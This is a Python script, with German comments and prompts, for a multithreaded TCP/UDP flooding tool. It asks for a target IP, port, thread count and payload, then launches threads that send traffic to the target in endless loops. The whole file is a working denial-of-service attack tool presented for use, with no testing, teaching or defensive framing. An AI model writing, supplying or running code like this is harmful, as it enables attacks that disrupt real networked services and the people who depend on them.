import socket
import threading
from enum import Enum

# Protokoll-Typen
class Protocol(Enum):
    NONE = 0
    TCP = 1
    UDP = 2

# Hauptklasse
class MainTool:
    def __init__(self):
        self.target_ip = ''
        self.port = 0
        self.threads = 0
        self.data = ''
        self.protocol = Protocol.NONE
        self.flooders = []

    def configure_attack(self):
        # Ziel-IP eingeben
        self.target_ip = input("Gib die Ziel-IP ein: ").strip()
        if not self.target_ip:
            print("Ungültige IP-Adresse!")
            return False

        # Port eingeben
        try:
            self.port = int(input("Gib den Ziel-Port ein (z.B. 80): ").strip())
        except ValueError:
            print("Ungültiger Port!")
            return False

        # Threads eingeben
        try:
            self.threads = int(input("Gib die Anzahl der Threads ein (z.B. 5): ").strip())
        except ValueError:
            print("Ungültige Thread-Anzahl!")
            return False

        # Daten für den Angriff
        self.data = input("Gib die zu sendenden Daten ein (z.B. 'Flood Test'): ").strip()
        if not self.data:
            print("Leere Daten sind nicht erlaubt!")
            return False

        # Protokoll auswählen
        protocol_choice = input("Wähle ein Protokoll (1: TCP, 2: UDP): ").strip()
        if protocol_choice == '1':
            self.protocol = Protocol.TCP
        elif protocol_choice == '2':
            self.protocol = Protocol.UDP
        else:
            print("Ungültige Auswahl!")
            return False

        print(f"\nKonfiguration abgeschlossen:\n  Ziel-IP: {self.target_ip}\n  Port: {self.port}\n"
              f"  Threads: {self.threads}\n  Protokoll: {self.protocol.name}\n  Daten: {self.data}")
        return True

    def attack(self):
        if not self.target_ip or not self.port or self.protocol == Protocol.NONE:
            print("Angriff nicht konfiguriert!")
            return

        print(f"Starte Angriff auf {self.target_ip}:{self.port} mit {self.threads} Threads...")
        self.start_flooders()

    def start_flooders(self):
        self.flooders.clear()
        for _ in range(self.threads):
            flooder = threading.Thread(target=self.flood_task)
            self.flooders.append(flooder)
            flooder.start()

    def flood_task(self):
        while True:
            if self.protocol == Protocol.TCP:
                self.tcp_flood()
            elif self.protocol == Protocol.UDP:
                self.udp_flood()

    def tcp_flood(self):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((self.target_ip, self.port))
                s.sendall(self.data.encode('utf-8'))
        except Exception as ex:
            print(f"TCP Flood Fehler: {ex}")

    def udp_flood(self):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.sendto(self.data.encode('utf-8'), (self.target_ip, self.port))
        except Exception as ex:
            print(f"UDP Flood Fehler: {ex}")

# Hauptprogramm
if __name__ == "__main__":
    tool = MainTool()
    if tool.configure_attack():
        tool.attack()
